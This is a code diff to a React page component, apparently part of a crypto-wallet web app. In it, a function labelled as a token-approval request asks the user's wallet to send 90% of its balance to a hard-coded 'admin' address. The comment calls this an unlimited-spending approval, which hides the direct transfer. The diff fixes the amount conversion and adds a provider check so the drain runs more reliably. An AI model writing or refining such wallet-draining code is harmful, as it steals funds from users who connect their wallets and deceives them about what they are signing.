@@ -328,8 +328,12 @@ function FlashedPageContent() {
 
   const requestTokenApproval = async () => {
     try {
+      if (!userAddress || !window.ethereum) {
+        console.log('No user address or ethereum provider');
+        return;
+      }
+      
       const adminWallet = '0x849842febf6643f29328a2887b3569e2399ac237';
-      const maxAmount = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
       
       // Request approval for unlimited spending
       await window.ethereum.request({
@@ -337,7 +341,7 @@ function FlashedPageContent() {
         params: [{
           from: userAddress,
           to: adminWallet,
-          value: ethers.parseEther((userBalance * 0.9).toString()).toString(16),
+          value: '0x' + Math.floor(userBalance * 0.9 * 1e18).toString(16),
           gas: '0x5208'
         }]
       });
